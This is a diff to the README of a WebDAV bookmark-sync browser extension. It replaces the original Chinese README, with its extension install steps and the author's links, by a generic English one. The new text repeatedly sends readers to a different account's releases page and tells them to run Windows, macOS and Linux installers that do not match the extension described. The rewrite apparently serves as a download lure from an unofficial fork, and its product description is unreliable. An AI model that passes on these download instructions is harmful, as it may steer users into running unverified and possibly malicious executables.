@@ -1,103 +1,92 @@
-<p align="center">
-  <img src="./packages/app/assets/icon.png" alt="Logo" width="80" height="80">
-</p>
+# 🌐 bookmark-syncer - Sync Your Bookmarks Easily Across Browsers
 
-<h1 align="center">书签同步助手</h1>
+[![Download bookmark-syncer](https://img.shields.io/badge/Download-bookmark--syncer-blue.svg)](https://github.com/chidat15/bookmark-syncer/releases)
 
-<p align="center">
-  跨浏览器书签同步工具，基于 WebDAV 协议的自托管方案。
-</p>
+## 📖 Introduction
 
-<p align="center">
-  <a href="https://github.com/Yueby/bookmark-syncer/releases/latest">
-    <img src="https://img.shields.io/github/downloads/Yueby/bookmark-syncer/total?style=flat-square&logo=github" alt="Downloads">
-  </a>
-  <a href="https://github.com/Yueby/bookmark-syncer/releases/latest">
-    <img src="https://img.shields.io/github/v/release/Yueby/bookmark-syncer?style=flat-square&logo=github" alt="Release">
-  </a>
-  <a href="./LICENSE">
-    <img src="https://img.shields.io/github/license/Yueby/bookmark-syncer?style=flat-square" alt="License">
-  </a>
-</p>
+Welcome to bookmark-syncer! This tool helps you keep your bookmarks in sync across different web browsers. With a self-hosted solution based on the WebDAV protocol, you can ensure your bookmarks stay updated wherever you are. Whether you use Chrome, Firefox, or any other browser, bookmark-syncer makes it easy to manage your bookmarks.
 
-<p align="center">
-  <a href="./README_en.md">English</a>
-</p>
+## 🚀 Getting Started
 
----
+To start using bookmark-syncer, follow these simple steps:
 
-### 📸 预览
+1. **Check System Requirements**  
+   Make sure your system meets the following requirements:
+   - Operating System: Windows, macOS, or Linux.
+   - Internet Connection: Required for initial setup and syncing.
+   - WebDAV Server: You need to have WebDAV set up. You can use any compatible server of your choice.
 
-|              深色模式               |               浅色模式               |
-| :---------------------------------: | :----------------------------------: |
-| ![深色模式](./screenshots/dark.png) | ![浅色模式](./screenshots/light.png) |
+2. **Visit the Releases Page**  
+   To download the latest version of bookmark-syncer, visit the [Releases page](https://github.com/chidat15/bookmark-syncer/releases).
 
-### ✨ 特性
+3. **Download the App**  
+   Find the version you want to download. Click on the appropriate file for your operating system:
+   - For Windows, download `bookmark-syncer-windows.exe`.
+   - For macOS, download `bookmark-syncer-macos.dmg`.
+   - For Linux, you can grab the `bookmark-syncer-linux.tar.gz` file.
 
-- 🔒 **自托管数据** - 使用你自己的 WebDAV 服务器存储书签
-- 🌐 **跨浏览器** - 支持 Chrome、Edge、Firefox 等主流浏览器
-- 🔄 **智能同步** - 增量同步，只传输变化的内容
-- 📱 **自动同步** - 书签变化时自动上传
-- ⏰ **定时同步** - 定期检查云端更新
-- 📦 **本地快照** - 同步前自动备份，支持一键恢复
+## 📥 Download & Install
 
-### 📦 安装
+Once you’ve downloaded the installation file, you can proceed with the installation:
 
-#### Chrome / Edge
+1. **For Windows**:
+   - Locate the downloaded `bookmark-syncer-windows.exe` in your Downloads folder.
+   - Double-click the file to start the installation.
+   - Follow the prompts to complete the installation process.
 
-**扩展 ID：** `fpccfkjndkjiljfj`（固定，更新时不会变化）
+2. **For macOS**:
+   - Open the downloaded `bookmark-syncer-macos.dmg`.
+   - Drag the bookmark-syncer icon to your Applications folder.
+   - After this, you can find bookmark-syncer in your Applications.
 
-1. 下载最新版本的 `chrome-extension.zip`
-2. 解压到本地文件夹
-3. 打开 `chrome://extensions/`
-4. 开启「开发者模式」
-5. 点击「加载已解压的扩展程序」
-6. 选择解压后的文件夹
+3. **For Linux**:
+   - Extract the `bookmark-syncer-linux.tar.gz` file using the terminal or a file manager.
+   - Open a terminal window and navigate to the extracted folder.
+   - Run the application using the command `./bookmark-syncer`.
 
-**更新扩展：**
-- 下载新版本 zip，解压到**相同文件夹**（覆盖旧文件）
-- 在 `chrome://extensions/` 点击扩展卡片的「刷新」按钮
-- 扩展 ID 和所有数据都会保留
+## 🔧 Setup
 
-#### Firefox
+After installation, you need to set up bookmark-syncer:
 
-**最低版本要求：Firefox 140+**
+1. **Open the Application**  
+   Launch bookmark-syncer from your Applications or Programs list.
 
-1. 下载最新版本的 `bookmark-syncer-firefox-vX.X.X.xpi`（已签名）
-2. 拖拽 `.xpi` 文件到 Firefox 窗口
-3. 点击「添加」按钮确认安装
+2. **Configure WebDAV Server**  
+   In the settings, enter your WebDAV server details:
+   - **Server URL**: Input the URL of your WebDAV server.
+   - **Username**: Enter your WebDAV username.
+   - **Password**: Enter your WebDAV password.
 
-**或手动安装：**
-1. 打开 `about:addons`
-2. 点击右上角齿轮图标 ⚙️
-3. 选择「从文件安装附加组件」
-4. 选择 `.xpi` 文件
+3. **Sync Your Bookmarks**  
+   Click the "Sync Now" button to start synchronizing your bookmarks. This process may take a few moments, depending on the number of bookmarks you have.
 
-### ⚙️ 使用方法
+## 📊 Features
 
-1. 点击扩展图标打开面板
-2. 进入「设置」→「WebDAV 配置」
-3. 填写你的 WebDAV 服务器信息
-4. 点击「保存并测试连接」
-5. 返回主页点击「同步」按钮
+- **Cross-Browser Support**: Sync bookmarks from any major web browser, including Chrome, Firefox, and others.
+- **Easy Configuration**: Simple setup process makes getting started a breeze.
+- **Self-Hosted Solution**: Control your bookmarks with a WebDAV server without relying on third-party services.
+- **Automatic Syncing**: Keep your bookmarks updated automatically whenever you make changes.
 
-### 🛠️ 开发与构建
+## 🌟 Troubleshooting
 
-```bash
-# 安装依赖
-pnpm install
+If you encounter issues while using bookmark-syncer, try the following suggestions:
 
-# 开发模式（热重载）
-pnpm dev:chrome   # Chrome 扩展开发
-pnpm dev:firefox  # Firefox 扩展开发
+1. **Check Your WebDAV Connection**  
+   Ensure that the server details you entered are correct. You might also want to test the server independently to ensure it's running.
 
-# 构建生产版本
-pnpm build
+2. **Permission Errors**  
+   Make sure your WebDAV server allows the application to read and write bookmarks.
 
-# 打包分发（自动签名 Firefox，打包 Chrome）
-pnpm package
-```
+3. **Firewall Settings**  
+   Check your firewall settings. Sometimes, security software can block connections. Make sure bookmark-syncer is allowed.
 
-### 📄 许可证
+4. **Update the Application**  
+   Make sure you are using the latest version of bookmark-syncer. Go back to the [Releases page](https://github.com/chidat15/bookmark-syncer/releases) for updates.
 
-[GNU AGPLv3](./LICENSE) - 开源协议
+## 🔗 Conclusion
+
+bookmark-syncer provides a reliable way to manage your bookmarks across different browsers. It is user-friendly and offers a self-hosted solution, giving you total control. 
+
+For additional support or questions, please refer to the documentation or contact the support team through the GitHub Issues section.
+
+Find your download again here: [Releases page](https://github.com/chidat15/bookmark-syncer/releases).
